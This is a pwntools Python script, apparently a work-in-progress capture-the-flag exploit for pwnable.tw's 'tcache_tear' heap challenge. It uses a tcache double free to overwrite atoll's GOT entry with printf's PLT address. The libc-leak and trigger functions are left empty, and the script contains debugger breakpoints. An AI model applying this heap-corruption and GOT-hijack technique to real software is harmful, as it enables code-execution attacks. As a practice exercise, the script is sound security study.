

from pwn import *
import pdb
import sys
from enum import Enum

class CHOICE(Enum):
  MALLOC = 1
  FREE = 2
  INFO = 3
  RENAME = 3
  EXIT = 4

def init(name):
  p.sendlineafter('Name:', name)

def choice(idx):
  if isinstance(idx, Enum):
    p.sendlineafter('Your choice :', str(idx.value))
  else:
    p.sendlineafter('Your choice :', str(idx))

def malloc(sz, cont):
  choice(CHOICE.MALLOC)
  p.sendlineafter('Size:', str(sz))
  p.sendlineafter('Data:', cont)

def free():
  choice(CHOICE.FREE)

def info(idx):
  choice(CHOICE.INFO)
  p.recvuntil('Name :')
  cont = p.recvuntil('$', drop=False)[:-1]
  return cont

def leak_libc(offset = 0):
  pass

def trigger():
  pass

DEBUG = True

p = process('/home/len/pwnable/tcache_tear')
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if not DEBUG:  
  p = remote('chall.pwnable.tw', 10106)
  elf = ELF('/home/len/pwnable/libc.so.6')  
  

context.log_level = 'debug'

atoll_got = 0x601FC8
printf_plt = 0x4007D0
system_offset = elf.symbols['system']


if __name__ == "__main__":
  pdb.set_trace()
  init('hello')

  malloc(8, 'a'*0x10)
  free()
  malloc(0x38, 'b'*0x10)
  free()
  
  pdb.set_trace()
  malloc(8, p64(0)+p64(0)+p64(0)+p64(0x41)+p64(atoll_got))
  malloc(0x38, p64(0))
  
  pdb.set_trace()
  malloc(0x30, p64(printf_plt))
  p.interactive()